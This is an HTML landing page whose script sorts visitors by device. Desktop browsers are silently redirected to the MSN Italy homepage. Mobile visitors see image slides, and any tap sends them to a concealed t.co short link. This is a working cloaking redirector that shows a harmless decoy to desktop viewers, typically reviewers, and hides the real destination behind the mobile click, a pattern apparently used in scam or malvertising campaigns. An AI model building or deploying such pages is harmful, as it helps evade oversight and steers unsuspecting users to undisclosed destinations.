<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Landing Page</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      overflow: hidden; /* desktop overflow hidden */
      font-family: sans-serif;
    }

    /* Scrollable container for mobile */
    .slides-container {
      height: 100%;
      width: 100%;
      overflow-y: scroll;
      scroll-snap-type: y mandatory;
      -webkit-overflow-scrolling: touch; /* smooth scroll on iOS */
    }

    .slide {
      height: 100vh;
      width: 100vw;
      background-size: cover;
      background-position: center;
      scroll-snap-align: start;
    }
  </style>
  <script>
    const desktopURL = "https://www.msn.com/it-it"; // Desktop redirect
    const mobileURL = "https://t.co/lU6lupZ2Qa";    // Mobile redirect on click

    const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i
      .test(navigator.userAgent.toLowerCase());

    if (!isMobile) {
      // Redirect desktop users immediately
      window.location.replace(desktopURL);
    }
  </script>
</head>
<body>

<!-- Mobile slides -->
<div class="slides-container">
  <div class="slide" style="background-image: url('https://i.imgur.com/9WjLGKl.jpg');"></div>
  <div class="slide" style="background-image: url('https://i.ibb.co/YBMg0Cqj/image2.jpg');"></div>
  <div class="slide" style="background-image: url('https://i.ibb.co/4ZLgbCF1/image3.jpg');"></div>
  <div class="slide" style="background-image: url('https://i.ibb.co/21Wb9Ntk/image4.jpg');"></div>
  <div class="slide" style="background-image: url('https://i.ibb.co/9mRpkhCs/image5.jpg');"></div>
</div>

<script>
  // Mobile click redirect
  document.body.addEventListener("click", () => {
    window.location.href = mobileURL;
  });
</script>

</body>
</html>
